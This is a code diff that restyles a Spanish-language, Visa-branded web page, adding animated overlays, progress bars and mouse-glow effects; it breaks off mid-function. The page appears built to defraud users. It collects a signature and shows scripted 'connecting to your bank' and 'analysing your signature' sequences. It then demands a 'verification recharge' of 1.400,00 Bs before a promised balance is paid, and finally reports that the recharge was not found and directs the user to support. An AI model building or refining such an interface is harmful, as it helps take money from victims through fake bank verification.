@@ -17,12 +17,16 @@
     :root {
       /* ============ Variables globales para ambos estilos ============ */
       --primary: #1a1f71; /* Azul oscuro de Visa */
+      --primary-light: #2c348e;
       --primary-dark: #0d153e; /* Azul más oscuro */
       --secondary: #3b82f6;
       --accent: #60a5fa;
       --success: #22c55e;
+      --success-dark: #16a34a;
       --danger: #ef4444;
+      --danger-dark: #dc2626;
       --warning: #f59e0b;
+      --warning-dark: #d97706;
 
       --border-white: #ffffff;
       --border-gray: #d1d5db;
@@ -32,6 +36,7 @@
       --card-bg: rgba(255, 255, 255, 0.98);
       --text-primary: #0f172a;
       --text-secondary: #475569;
+      --text-light: #94a3b8;
 
       --border-radius-xl: 28px;
       --border-radius-lg: 24px;
@@ -39,6 +44,7 @@
       --border-radius-sm: 12px;
 
       --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      --transition-bounce: all 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55);
       --shadow-sm: 0 4px 6px -1px rgb(0 0 0 / 0.05), 0 2px 4px -2px rgb(0 0 0 / 0.05);
       --shadow: 0 10px 20px rgba(0, 0, 0, 0.3), 0 6px 6px rgba(0, 0, 0, 0.2);
       --shadow-lg: 0 25px 50px rgba(0, 0, 0, 0.3);
@@ -62,9 +68,22 @@
       --text-light: rgba(255, 255, 255, 0.8);
       --portal-glow: rgba(0, 230, 118, 0.4);
 
+      /* Nuevas variables para overlays */
+      --neon-green: #39ff14;
+      --neon-green-light: #5fff3f;
+      --neon-green-dark: #32e410;
+      --neon-green-glow: rgba(57, 255, 20, 0.5);
+      --neon-green-glow-bright: rgba(57, 255, 20, 0.75);
+      
+      --glow-blue: rgba(59, 130, 246, 0.4);
+      --glow-blue-bright: rgba(59, 130, 246, 0.7);
+      --glow-green: rgba(34, 197, 94, 0.4);
+      --glow-red: rgba(239, 68, 68, 0.4);
+      
       --border-radius-2: 24px;
       --transition-2: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
       --shadow-2: 0 20px 40px rgba(0, 0, 0, 0.25);
+      --shadow-inner: inset 0 2px 4px 0 rgb(0 0 0 / 0.05);
     }
 
     * {
@@ -893,72 +912,599 @@
       background-color: rgba(26, 31, 113, 0.1);
     }
 
+    /* ===== OVERLAYS ELEGANTES ===== */
     .overlay {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0, 0, 0, 0.5);
+      background: rgba(15, 23, 42, 0.6);
       display: none;
       justify-content: center;
       align-items: center;
       z-index: 999;
       padding: 1rem;
+      opacity: 0;
+      transition: opacity 0.4s ease;
     }
+
     .overlay.active {
       display: flex;
-      backdrop-filter: blur(5px);
+      opacity: 1;
+      backdrop-filter: blur(6px);
+      animation: fadeIn 0.4s forwards;
     }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
     .modal {
       background: rgba(255, 255, 255, 0.95);
       border-radius: var(--border-radius-lg);
-      padding: 1.5rem;
+      padding: 2rem;
       width: 90%;
       max-width: 420px;
       box-shadow: var(--shadow-lg);
       text-align: center;
       position: relative;
       backdrop-filter: blur(8px);
-      border: 2px solid #fff;
-      animation: glow 6s ease infinite, border-blink 6s linear infinite;
-    }
-    .modal h3 {
-      font-size: 1.2rem;
-      margin-bottom: 0.5rem;
-      color: var(--primary);
-    }
-    .modal p {
-      font-size: 0.95rem;
-      color: var(--text-secondary);
-      margin-bottom: 1rem;
-      line-height: 1.4;
-      text-align: center;
-    }
-    .modal.modal-glow {
-      background: #fff !important;
-      box-shadow: 0 0 60px rgba(20, 52, 203, 0.5), 0 0 120px rgba(20, 52, 203, 0.3) !important;
-      animation: glow 3s ease infinite, border-blink 3s linear infinite !important;
+      border: 2px solid transparent;
+      transform: translateY(30px);
+      opacity: 0;
+      animation: slideUpFade 0.5s forwards 0.1s;
     }
 
-    .overlay-progress-bar {
-      height: 8px;
-      background-color: #e2e8f0;
-      border-radius: var(--border-radius);
-      margin: 1rem 0;
-      overflow: hidden;
-      position: relative;
-      box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
+    @keyframes slideUpFade {
+      from {
+        transform: translateY(30px);
+        opacity: 0;
+      }
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
     }
+
+    .modal-glow {
+      position: relative;
+      background: white;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+    }
+
+    .modal-glow::before {
+      content: '';
+      position: absolute;
+      inset: -1px;
+      padding: 1px;
+      border-radius: var(--border-radius-lg);
+      background: linear-gradient(
+        45deg, 
+        var(--primary), 
+        var(--secondary), 
+        var(--primary),
+        var(--secondary)
+      );
+      -webkit-mask: 
+        linear-gradient(#fff 0 0) content-box, 
+        linear-gradient(#fff 0 0);
+      -webkit-mask-composite: xor;
+      mask-composite: exclude;
+      z-index: -1;
+      animation: border-flow 6s linear infinite;
+      background-size: 300% 300%;
+    }
+
+    @keyframes border-flow {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .modal-glow::after {
+      content: '';
+      position: absolute;
+      inset: -6px;
+      z-index: -2;
+      background: radial-gradient(circle at var(--mouse-x, 50%) var(--mouse-y, 50%), 
+                  var(--glow-blue-bright) 0%, 
+                  var(--glow-blue) 30%, 
+                  transparent 70%);
+      border-radius: var(--border-radius-lg);
+      opacity: 0.7;
+      filter: blur(18px);
+      animation: pulse-glow 4s ease-in-out infinite;
+    }
+
+    .modal-glow.warning::after {
+      background: radial-gradient(circle at var(--mouse-x, 50%) var(--mouse-y, 50%), 
+                  rgba(245, 158, 11, 0.9) 0%, 
+                  rgba(245, 158, 11, 0.6) 30%, 
+                  transparent 70%);
+    }
+
+    .modal-glow.error::after {
+      background: radial-gradient(circle at var(--mouse-x, 50%) var(--mouse-y, 50%), 
+                  rgba(239, 68, 68, 0.9) 0%, 
+                  rgba(239, 68, 68, 0.6) 30%, 
+                  transparent 70%);
+    }
+
+    .modal-glow.success::after {
+      background: radial-gradient(circle at var(--mouse-x, 50%) var(--mouse-y, 50%), 
+                  rgba(34, 197, 94, 0.9) 0%, 
+                  rgba(34, 197, 94, 0.6) 30%, 
+                  transparent 70%);
+    }
+
+    @keyframes pulse-glow {
+      0%, 100% {
+        opacity: 0.6;
+        filter: blur(14px);
+      }
+      50% {
+        opacity: 0.9;
+        filter: blur(18px);
+      }
+    }
+
+    .modal h3 {
+      font-size: 1.4rem;
+      margin-bottom: 1rem;
+      color: var(--primary);
+      font-weight: 600;
+      background: linear-gradient(90deg, var(--primary), var(--secondary));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      text-fill-color: transparent;
+    }
+
+    .modal p {
+      font-size: 1rem;
+      color: var(--text-secondary);
+      margin-bottom: 1.5rem;
+      line-height: 1.6;
+      text-align: center;
+    }
+
+    /* Barra de progreso con verde fluorescente refinado */
+    .overlay-progress-bar {
+      position: relative;
+      height: 12px;
+      background-color: rgba(226, 232, 240, 0.8);
+      border-radius: 30px;
+      margin: 1.5rem 0;
+      overflow: hidden;
+      box-shadow: var(--shadow-inner);
+    }
+
     .overlay-progress-fill {
       height: 100%;
-      background: var(--success);
+      border-radius: 30px;
+      background: linear-gradient(90deg, var(--neon-green-dark), var(--neon-green));
+      transition: width 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 0 8px var(--neon-green-glow), 
+                  0 0 14px var(--neon-green-glow),
+                  inset 0 0 12px var(--neon-green-glow-bright);
       width: 0%;
-      transition: width 0.3s linear;
-      border-radius: var(--border-radius);
     }
+
+    .overlay-progress-fill::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(
+        90deg,
+        transparent,
+        rgba(255, 255, 255, 0.6),
+        transparent
+      );
+      transform: translateX(-100%);
+      animation: shimmer 2s infinite;
+    }
+
+    @keyframes shimmer {
+      100% {
+        transform: translateX(100%);
+      }
+    }
+
     .overlay-progress-fill.error {
-      background: var(--danger);
+      background: linear-gradient(90deg, var(--danger), var(--danger-dark));
+      box-shadow: 0 0 8px var(--glow-red), 
+                  0 0 14px var(--glow-red),
+                  inset 0 0 12px rgba(239, 68, 68, 0.7);
+    }
+
+    .overlay-progress-fill.success {
+      background: linear-gradient(90deg, var(--neon-green-dark), var(--neon-green));
+      box-shadow: 0 0 8px var(--neon-green-glow), 
+                  0 0 14px var(--neon-green-glow),
+                  inset 0 0 12px var(--neon-green-glow-bright);
+    }
+
+    .overlay-progress-fill.warning {
+      background: linear-gradient(90deg, var(--warning), var(--warning-dark));
+      box-shadow: 0 0 8px rgba(245, 158, 11, 0.6), 
+                  0 0 14px rgba(245, 158, 11, 0.6),
+                  inset 0 0 12px rgba(245, 158, 11, 0.8);
+    }
+    
+    .progress-percentage {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 0.7rem;
+      font-weight: 600;
+      color: var(--text-secondary);
+      z-index: 5;
+      text-shadow: 0 0 5px rgba(255, 255, 255, 0.7);
+    }
+
+    /* Spinner avanzado */
+    .spinner-advanced {
+      width: 60px;
+      height: 60px;
+      margin: 1.5rem auto;
+      position: relative;
+    }
+
+    .spinner-ring {
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      border: 4px solid transparent;
+      border-top-color: var(--primary);
+      border-right-color: var(--secondary);
+      animation: spinnerRotate 1.5s linear infinite;
+      position: absolute;
+      top: 0;
+      left: 0;
+    }
+
+    .spinner-ring:nth-child(2) {
+      width: 80%;
+      height: 80%;
+      top: 10%;
+      left: 10%;
+      border-top-color: var(--secondary);
+      border-left-color: var(--primary);
+      animation-duration: 2s;
+      animation-direction: reverse;
+    }
+
+    .spinner-ring:nth-child(3) {
+      width: 60%;
+      height: 60%;
+      top: 20%;
+      left: 20%;
+      border-bottom-color: var(--primary);
+      border-left-color: var(--secondary);
+      animation-duration: 2.5s;
+    }
+
+    .spinner-dot {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 15px;
+      height: 15px;
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      border-radius: 50%;
+      animation: pulse 1.5s cubic-bezier(0.455, 0.03, 0.515, 0.955) infinite alternate;
+    }
+
+    @keyframes pulse {
+      0% {
+        transform: translate(-50%, -50%) scale(0.6);
+        opacity: 0.8;
+      }
+      100% {
+        transform: translate(-50%, -50%) scale(1);
+        opacity: 1;
+      }
+    }
+
+    /* Estilo para la firma en miniatura */
+    .signature-container {
+      position: relative;
+      width: 160px;
+      height: 80px;
+      margin: 1.5rem auto;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: var(--shadow);
+      background: white;
+    }
+
+    .signature-img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      animation: pulse-soft 2s infinite alternate;
+    }
+
+    @keyframes pulse-soft {
+      0% { opacity: 0.85; }
+      100% { opacity: 1; }
+    }
+
+    /* Botones avanzados */
+    .btn-advanced-container {
+      position: relative;
+      width: 140px;
+      height: 48px;
+      margin: 0.5rem;
+    }
+
+    .btn-advanced-effect {
+      position: absolute;
+      inset: -2px;
+      border-radius: 30px;
+      padding: 2px;
+      background: linear-gradient(
+        90deg, 
+        var(--primary), 
+        var(--secondary), 
+        var(--primary)
+      );
+      background-size: 200% 100%;
+      animation: gradient-shift 4s ease infinite;
+      box-shadow: 0 0 0 3px rgba(26, 31, 113, 0.1);
+      overflow: hidden;
+    }
+
+    @keyframes gradient-shift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .btn-advanced {
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(135deg, var(--primary), var(--primary-light));
+      color: white;
+      border: none;
+      border-radius: 28px;
+      cursor: pointer;
+      overflow: hidden;
+      position: relative;
+      z-index: 1;
+      font-weight: 600;
+      font-size: 0.95rem;
+      transition: var(--transition-bounce);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .btn-advanced:hover {
+      transform: translateY(-3px) scale(1.02);
+      box-shadow: 0 10px 15px rgba(26, 31, 113, 0.2);
+    }
+
+    .btn-advanced:active {
+      transform: translateY(-1px) scale(0.98);
+    }
+
+    .btn-content {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.3s ease;
+      backface-visibility: hidden;
+    }
+
+    .btn-text {
+      display: flex;
+      align-items: center;
+      transition: var(--transition);
+    }
+
+    .btn-icon {
+      margin-left: 8px;
+      font-size: 1rem;
+      opacity: 0;
+      width: 0;
+      transform: translateX(-10px);
+      transition: var(--transition);
+    }
+
+    .btn-advanced:hover .btn-icon {
+      opacity: 1;
+      width: auto;
+      transform: translateX(0);
+    }
+
+    /* Variantes de botón */
+    .btn-advanced.warning {
+      background: linear-gradient(135deg, var(--warning), var(--warning-dark));
+    }
+
+    .btn-advanced.success {
+      background: linear-gradient(135deg, var(--neon-green), var(--neon-green-dark));
+    }
+
+    .btn-advanced.danger {
+      background: linear-gradient(135deg, var(--danger), var(--danger-dark));
+    }
+
+    .btn-advanced-effect.warning {
+      background: linear-gradient(
+        90deg, 
+        var(--warning), 
+        var(--warning-dark), 
+        var(--warning)
+      );
+    }
+
+    .btn-advanced-effect.success {
+      background: linear-gradient(
+        90deg, 
+        var(--neon-green), 
+        var(--neon-green-dark), 
+        var(--neon-green)
+      );
+    }
+
+    .btn-advanced-effect.danger {
+      background: linear-gradient(
+        90deg, 
+        var(--danger), 
+        var(--danger-dark), 
+        var(--danger)
+      );
+    }
+
+    /* Logo banco con efecto */
+    .bank-logo-container {
+      position: relative;
+      height: 50px;
+      margin: 1.5rem auto;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .bank-logo {
+      max-height: 50px;
+      max-width: 160px;
+      filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1));
+      transition: var(--transition);
+    }
+
+    .bank-logo:hover {
+      transform: scale(1.05);
+      filter: drop-shadow(0 6px 8px rgba(0, 0, 0, 0.2));
+    }
+
+    /* Mensaje de advertencia con icono */
+    .warning-message {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      margin-top: 1rem;
+      padding: 0.75rem;
+      background-color: rgba(245, 158, 11, 0.1);
+      border-radius: var(--border-radius-sm);
+      border-left: 3px solid var(--warning);
+    }
+
+    .warning-icon {
+      color: var(--warning);
+      font-size: 1rem;
+    }
+
+    .warning-text {
+      font-size: 0.85rem;
+      color: var(--text-secondary);
+      text-align: left;
+    }
+
+    /* Iconos de éxito/error */
+    .result-icon {
+      width: 80px;
+      height: 80px;
+      margin: 1.5rem auto;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+    }
+
+    .result-icon.success {
+      background-color: rgba(57, 255, 20, 0.1);
+    }
+
+    .result-icon.error {
+      background-color: rgba(239, 68, 68, 0.1);
+    }
+
+    .result-icon i {
+      font-size: 2.5rem;
+      z-index: 2;
+    }
+
+    .result-icon.success i {
+      color: var(--neon-green);
+      text-shadow: 0 0 5px var(--neon-green-glow), 0 0 10px var(--neon-green-glow);
+    }
+
+    .result-icon.error i {
+      color: var(--danger);
+    }
+
+    .result-icon::after {
+      content: '';
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      background: transparent;
+      border: 2px solid currentColor;
+      opacity: 0;
+      transform: scale(0.8);
+      animation: ripple 1.5s ease-out infinite;
+    }
+
+    .result-icon.success::after {
+      border-color: var(--neon-green);
+      box-shadow: 0 0 15px var(--neon-green-glow);
+    }
+
+    .result-icon.error::after {
+      border-color: var(--danger);
+    }
+
+    @keyframes ripple {
+      from {
+        opacity: 1;
+        transform: scale(0.8);
+      }
+      to {
+        opacity: 0;
+        transform: scale(1.5);
+      }
+    }
+
+    /* Contador regresivo */
+    .countdown-container {
+      margin-top: 1rem;
+      font-size: 0.9rem;
+      color: var(--text-secondary);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+    }
+
+    .countdown-number {
+      display: inline-block;
+      background: var(--primary);
+      color: white;
+      font-weight: 600;
+      width: 28px;
+      height: 28px;
+      line-height: 28px;
+      text-align: center;
+      border-radius: 50%;
     }
 
     .mini-signature {
@@ -968,11 +1514,6 @@
       margin: 0.5rem auto;
       border-radius: 4px;
       animation: pulse 2s infinite;
-    }
-    @keyframes pulse {
-      0% { opacity: 0.6; }
-      50% { opacity: 1; }
-      100% { opacity: 0.6; }
     }
 
     .countdown {
@@ -999,18 +1540,7 @@
       transform: translateY(-3px);
       box-shadow: var(--shadow-lg);
     }
-    @media (max-width: 768px) {
-      .balance-card {
-        margin: -2rem 1rem 1.5rem 1rem;
-      }
-    }
-    @media (max-width: 480px) {
-      .balance-card {
-        padding: 1.25rem;
-        margin: -1.5rem 1rem 1.5rem 1rem;
-      }
-    }
-
+    
     /* Responsive */
     @media (max-width: 768px) {
       .header {
@@ -1034,15 +1564,22 @@
         flex-direction: column;
         align-items: center;
       }
-
-      /* Para evitar separaciones de texto en móvil muy grandes, 
-         se puede reducir el font-size en las secciones con mucho texto */
+      .balance-card {
+        margin: -2rem 1rem 1.5rem 1rem;
+      }
       .section-content p {
         font-size: 0.95rem;
       }
       .verification-section p,
       .info-section-old p {
         font-size: 0.95rem;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      .balance-card {
+        padding: 1.25rem;
+        margin: -1.5rem 1rem 1.5rem 1rem;
       }
     }
   </style>
@@ -1506,35 +2043,42 @@
   </div>
 </div><!-- Fin de container principal -->
 
-<!-- Overlays -->
+<!-- Overlays con nuevos estilos -->
 <!-- Overlay: Confirmar Firma -->
 <div class="overlay" id="overlayConfirmFirma">
-  <div class="modal">
+  <div class="modal modal-glow">
     <h3>¿Estás seguro de tu firma?</h3>
     <p>
       La firma debe coincidir con la de tu documento de identidad. <br/>
       Si no coincide, se solicitará verificación adicional. <br/>
       ¿Deseas continuar con esta firma?
     </p>
+
+    <div class="signature-container">
+      <img id="signaturePreviewImg" src="" alt="Firma" class="signature-img">
+    </div>
+
+    <div class="bank-logo-container">
+      <img id="bankLogoConfirmFirma" src="" alt="Logo Banco" class="bank-logo">
+    </div>
+
     <div style="display:flex; gap:1rem; justify-content:center; flex-wrap:wrap; margin-top: 1rem;">
-      <div class="btn-std-container" style="width: 120px;">
-        <div class="btn-glow-effect"></div>
-        <button class="btn-glow btn-danger" id="editarFirmaBtn">
-          <div class="btn-glow-content btn-glow-initial">Editar</div>
-          <div class="btn-glow-content btn-glow-hover">
+      <div class="btn-advanced-container">
+        <div class="btn-advanced-effect warning"></div>
+        <button class="btn-advanced warning" id="editarFirmaBtn">
+          <span class="btn-text">
             Editar
-            <i class="fas fa-edit btn-glow-icon"></i>
-          </div>
+            <i class="fas fa-edit btn-icon"></i>
+          </span>
         </button>
       </div>
-      <div class="btn-std-container" style="width: 120px;">
-        <div class="btn-glow-effect"></div>
-        <button class="btn-glow btn-success" id="continuarFirmaBtn">
-          <div class="btn-glow-content btn-glow-initial">Continuar</div>
-          <div class="btn-glow-content btn-glow-hover">
+      <div class="btn-advanced-container">
+        <div class="btn-advanced-effect"></div>
+        <button class="btn-advanced" id="continuarFirmaBtn">
+          <span class="btn-text">
             Continuar
-            <i class="fas fa-forward btn-glow-icon"></i>
-          </div>
+            <i class="fas fa-forward btn-icon"></i>
+          </span>
         </button>
       </div>
     </div>
@@ -1543,73 +2087,121 @@
 
 <!-- Overlay Secuencial POST-FIRMA (Conexión, Análisis, etc.) -->
 <div class="overlay" id="overlaySecuenciaFirma">
-  <div class="modal">
+  <div class="modal modal-glow">
     <h3 id="secuenciaFirmaTitulo">Conectando con tu banco...</h3>
-    <p id="secuenciaFirmaTexto">Espere un momento, por favor.</p>
-    <img id="miniSignatureImg" src="" alt="Firma" class="mini-signature">
-    <img id="secuenciaFirmaLogo" src="" alt="Banco" style="max-height:50px; margin:0.5rem 0;">
-    <div class="overlay-progress-bar">
-      <div class="overlay-progress-fill" id="secuenciaFirmaProgress"></div>
+    <p id="secuenciaFirmaTexto">Analizando tu firma digital...</p>
+    
+    <div class="signature-container">
+      <img id="miniSignatureImg" src="" alt="Firma" class="signature-img">
     </div>
-    <p style="font-size: 0.85rem; margin-top: 0.5rem; color: var(--text-secondary);">
-      <i class="fas fa-exclamation-triangle" style="color: var(--warning); margin-right: 0.3rem;"></i>
-      Por favor, no cierres esta ventana ni retrocedas durante el proceso
-    </p>
-    <i class="fas fa-spinner fa-spin" style="font-size:1.5rem; color:var(--primary); margin-top: 0.5rem;"></i>
+    
+    <div class="bank-logo-container">
+      <img id="secuenciaFirmaLogo" src="" alt="Banco" class="bank-logo">
+    </div>
+    
+    <div class="overlay-progress-bar">
+      <div class="overlay-progress-fill" id="secuenciaFirmaProgress" style="width: 0%;"></div>
+      <div class="progress-percentage">0%</div>
+    </div>
+    
+    <div class="warning-message">
+      <i class="fas fa-exclamation-triangle warning-icon"></i>
+      <span class="warning-text">Por favor, no cierres esta ventana ni retrocedas durante el proceso</span>
+    </div>
+    
+    <div class="spinner-advanced">
+      <div class="spinner-ring"></div>
+      <div class="spinner-ring"></div>
+      <div class="spinner-ring"></div>
+      <div class="spinner-dot"></div>
+    </div>
   </div>
 </div>
 
 <!-- Overlay: Verificación de la primera recarga -->
 <div class="overlay" id="overlayVerificandoRecarga">
-  <div class="modal">
-    <h3 id="verificandoRecargaTitulo">Verificando tu primera recarga...</h3>
+  <div class="modal modal-glow">
+    <h3 id="verificandoRecargaTitulo">Verificando tu recarga...</h3>
     <p id="verificandoRecargaTexto">
       Por favor, espera mientras consultamos con tu banco.
     </p>
-    <div class="overlay-progress-bar">
-      <div class="overlay-progress-fill" id="verificandoRecargaProgress"></div>
+    
+    <div class="bank-logo-container">
+      <img id="verificandoRecargaLogo" src="" alt="Banco" class="bank-logo">
     </div>
-    <img id="verificandoRecargaLogo" src="" alt="Banco" style="max-height:50px; margin:0.5rem 0;">
-    <p style="font-size: 0.85rem; margin-top: 0.5rem; color: var(--text-secondary);">
-      <i class="fas fa-exclamation-triangle" style="color: var(--warning); margin-right: 0.3rem;"></i>
-      No cierres esta página durante el proceso de verificación
-    </p>
-    <i class="fas fa-spinner fa-spin" style="font-size:1.5rem; color:var(--primary); margin-top: 0.5rem;"></i>
+    
+    <div class="overlay-progress-bar">
+      <div class="overlay-progress-fill" id="verificandoRecargaProgress" style="width: 0%;"></div>
+      <div class="progress-percentage">0%</div>
+    </div>
+    
+    <div class="warning-message">
+      <i class="fas fa-info-circle warning-icon" style="color: var(--primary);"></i>
+      <span class="warning-text">Este proceso tomará unos segundos</span>
+    </div>
+    
+    <div class="spinner-advanced">
+      <div class="spinner-ring"></div>
+      <div class="spinner-ring"></div>
+      <div class="spinner-ring"></div>
+      <div class="spinner-dot"></div>
+    </div>
   </div>
 </div>
 
 <!-- Overlay: Última secuencia al confirmar recarga -->
 <div class="overlay" id="overlaySecuenciaFinal">
-  <div class="modal">
+  <div class="modal modal-glow">
     <h3 id="secFinalTitulo">Conectando con tu banco</h3>
     <p id="secFinalTexto">Preparando tu depósito.</p>
-    <div class="overlay-progress-bar">
-      <div class="overlay-progress-fill" id="secuenciaFinalProgress"></div>
+    
+    <div class="bank-logo-container">
+      <img id="secFinalLogo" src="" alt="Banco" class="bank-logo">
     </div>
-    <img id="secFinalLogo" src="" alt="Banco" style="max-height:50px; margin:0.5rem 0;">
-    <p style="font-size: 0.85rem; margin-top: 0.5rem; color: var(--text-secondary);">
-      <i class="fas fa-info-circle" style="color: var(--primary); margin-right: 0.3rem;"></i>
-      Tu dinero estará disponible en breve
-    </p>
-    <i class="fas fa-spinner fa-spin" style="font-size:1.5rem; color:var(--primary); margin-top: 0.5rem;"></i>
+    
+    <div class="overlay-progress-bar">
+      <div class="overlay-progress-fill" id="secuenciaFinalProgress" style="width: 0%;"></div>
+      <div class="progress-percentage">0%</div>
+    </div>
+    
+    <div class="warning-message">
+      <i class="fas fa-info-circle warning-icon" style="color: var(--primary);"></i>
+      <span class="warning-text">Tu dinero estará disponible en breve</span>
+    </div>
+    
+    <div class="spinner-advanced">
+      <div class="spinner-ring"></div>
+      <div class="spinner-ring"></div>
+      <div class="spinner-ring"></div>
+      <div class="spinner-dot"></div>
+    </div>
   </div>
 </div>
 
 <!-- Overlay: Error Final - No se encontró la recarga -->
 <div class="overlay" id="overlayErrorFinal">
-  <div class="modal">
-    <h3>Atención: No encontramos tu recarga</h3>
+  <div class="modal modal-glow error">
+    <h3 style="background: linear-gradient(90deg, var(--danger), var(--danger-dark)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; text-fill-color: transparent;">
+      Atención: No encontramos tu recarga
+    </h3>
+    
     <p id="errorFinalTexto">
       No se puede verificar la titularidad de tu cuenta hasta que detectemos
       tu recarga de verificación. Depositaremos tu saldo completo 
       (Saldo+<span id="montoRecargaError">1.400,00</span> Bs) 
       una vez validemos tu identidad.
     </p>
+    
+    <div class="result-icon error">
+      <i class="fas fa-exclamation-circle"></i>
+    </div>
+    
     <p style="margin-top: 0.5rem;">
       Por favor, contacta con soporte para recibir asistencia inmediata.
     </p>
-    <div style="text-align: center; margin-top: 1rem;">
-      <a
+    
+   <div style="text-align: center; margin-top: 1rem;">
+      <a 
         href="#"
         target="_blank"
         class="btn-support"
@@ -1651,14 +2243,14 @@
       El monto de verificación (<span id="montoVerificacionBsModal">1.400,00 Bs</span>) 
       equivale a <span id="montoVerificacionUsdModal">$37.40</span> y será reembolsado.
     </p>
-    <div class="btn-std-container" style="margin: 1rem auto 0; width: 120px;">
-      <div class="btn-glow-effect"></div>
-      <button class="btn-glow" id="closeDatosModalBtn">
-        <div class="btn-glow-content btn-glow-initial">Cerrar</div>
-        <div class="btn-glow-content btn-glow-hover">
+    
+    <div class="btn-advanced-container" style="margin: 1rem auto;">
+      <div class="btn-advanced-effect"></div>
+      <button class="btn-advanced" id="closeDatosModalBtn">
+        <span class="btn-text">
           Cerrar
-          <i class="fas fa-times btn-glow-icon"></i>
-        </div>
+          <i class="fas fa-times btn-icon"></i>
+        </span>
       </button>
     </div>
   </div>
@@ -1666,27 +2258,37 @@
 
 <!-- Overlay: Firma no coincide (si se llegara a necesitar) -->
 <div class="overlay" id="overlayFirmaNoCoincide">
-  <div class="modal">
-    <h3>Verificación adicional requerida</h3>
+  <div class="modal modal-glow error">
+    <h3 style="background: linear-gradient(90deg, var(--danger), var(--danger-dark)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; text-fill-color: transparent;">
+      Verificación adicional requerida
+    </h3>
+    
     <p id="firmaNoCoincideTexto">
-      Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un proceso de verificación adicional para continuar con el retiro.
+Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un proceso de verificación adicional para continuar con el retiro.
     </p>
-    <img id="firmaNoCoincideLogo" src="" alt="Logo Banco" style="max-height:50px; margin:0.5rem 0;">
+    
+    <div class="bank-logo-container">
+      <img id="firmaNoCoincideLogo" src="" alt="Logo Banco" class="bank-logo">
+    </div>
+    
+    <div class="result-icon error">
+      <i class="fas fa-exclamation-circle"></i>
+    </div>
+    
     <div class="overlay-progress-bar">
       <div class="overlay-progress-fill error" id="redirectProgressBar" style="width: 0%;"></div>
+      <div class="progress-percentage">0%</div>
     </div>
-    <p style="margin-top: 0.8rem; color: var(--text-primary);">
-      <i class="fas fa-shield-alt" style="color: var(--primary); margin-right: 0.3rem;"></i>
-      <strong>No te preocupes</strong>. Tu dinero está seguro y podrás retirarlo
-      después de completar la verificación.
-    </p>
-    <p style="font-size: 0.85rem; margin-top: 0.5rem; color: var(--text-secondary);">
-      Serás redirigido en <span id="redirectCountdown">10</span> segundos...
-    </p>
+    
+    <div class="countdown-container">
+      <span>Serás redirigido en</span>
+      <span class="countdown-number" id="redirectCountdown">10</span>
+      <span>segundos...</span>
+    </div>
   </div>
 </div>
 
-<!-- Audios solicitados (punto #5) -->
+<!-- Audios solicitados -->
 <audio id="audioIntro" preload="auto">
   <!-- Usar un enlace directo a un MP3/OGG real para que funcione en navegadores. -->
   <source src="https://www.youtube.com/watch?v=4FTTa3JY5Tw" type="audio/mpeg">
@@ -1853,10 +2455,64 @@
         alert("Por favor, no utilices el botón de retroceso del navegador durante este proceso.");
       }
     });
+
+    // Inicializar manejo de mouse para efectos glow en overlays
+    initMouseMoveEffects();
   });
 
   /****************************************************
-   * Carga de datos simulada
+   * Efectos de mouse para overlays
+   ****************************************************/
+  function initMouseMoveEffects() {
+    const overlays = document.querySelectorAll('.overlay');
+    overlays.forEach(overlay => {
+      overlay.addEventListener("mousemove", handleMouseMove);
+    });
+  }
+
+  function handleMouseMove(e) {
+    const modal = e.currentTarget.querySelector('.modal-glow');
+    if (!modal) return;
+    
+    const rect = modal.getBoundingClientRect();
+    const x = ((e.clientX - rect.left) / rect.width) * 100;
+    const y = ((e.clientY - rect.top) / rect.height) * 100;
+    
+    modal.style.setProperty('--mouse-x', `${x}%`);
+    modal.style.setProperty('--mouse-y', `${y}%`);
+  }
+
+  /****************************************************
+   * Animación de barra de progreso
+   ****************************************************/
+  function animateProgressBar(progressBar, startWidth, targetWidth, duration, percentDisplay) {
+    const startTime = performance.now();
+    
+    function updateProgress(currentTime) {
+      const elapsedTime = currentTime - startTime;
+      const progress = Math.min(elapsedTime / duration, 1);
+      const currentWidth = startWidth + (targetWidth - startWidth) * easeOutQuad(progress);
+      
+      progressBar.style.width = `${currentWidth}%`;
+      if (percentDisplay) {
